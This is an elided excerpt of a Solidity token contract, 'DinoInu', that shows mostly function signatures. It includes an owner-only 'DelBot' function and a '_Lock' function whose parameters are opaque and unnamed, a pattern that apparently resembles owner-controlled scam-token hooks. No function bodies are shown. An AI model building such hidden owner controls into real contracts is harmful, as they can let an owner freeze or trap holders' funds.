...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function DelBot(address account, bool v1, bool v2, bool v3, uint256 v4) external onlyOwner {
    ...
    function _Lock(address account, uint256 amount, uint256 val1, uint256 val2) internal virtual {
...
contract ERC20Dino is Context, ERC20 {
    constructor(
        ...
        _Lock(owner, initialSupply, house6, house7);
    }
}

contract DinoInu is ERC20Dino {
    constructor() ERC20Dino("DinoInu", "DinoInu", false, true, 900, 25, msg.sender, 100000000 * 10 ** 18, msg.sender, 10) {
    }
}